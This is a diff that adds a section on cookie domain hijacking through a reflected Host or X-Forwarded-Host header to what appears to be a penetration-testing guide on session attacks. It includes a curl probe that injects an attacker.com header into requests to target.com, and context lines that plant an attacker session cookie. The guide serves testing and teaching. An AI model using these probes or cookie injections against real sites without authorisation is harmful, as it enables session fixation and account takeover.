@@ -89,7 +89,24 @@ for (let i = 0; i < 700; i++) {
 document.cookie = "PHPSESSID=attacker_session; Domain=.target.com; Path=/";
 ```
 
-### 1.5 Testing Checklist
+### 1.5 Cookie Domain Scoping Hijack via Host Header
+
+When a server reflects the `Host` or `X-Forwarded-Host` header into the `domain` attribute of a `Set-Cookie` header.
+
+**Vector:**
+```bash
+curl -s -I -H "X-Forwarded-Host: attacker.com" "https://target.com/"
+```
+
+**Vulnerable Response:**
+```http
+HTTP/1.1 200 OK
+Set-Cookie: session=xyz; Domain=attacker.com; Path=/; Secure; HttpOnly
+```
+
+**Impact:** The browser scopes the session cookie to the *attacker's* domain. If the attacker can then trick the victim into visiting a malicious page on `attacker.com`, the cookie may be leaked or manipulated, leading to Account Takeover (ATO).
+
+### 1.6 Testing Checklist
 
 ```
 1. Authenticate, note session ID
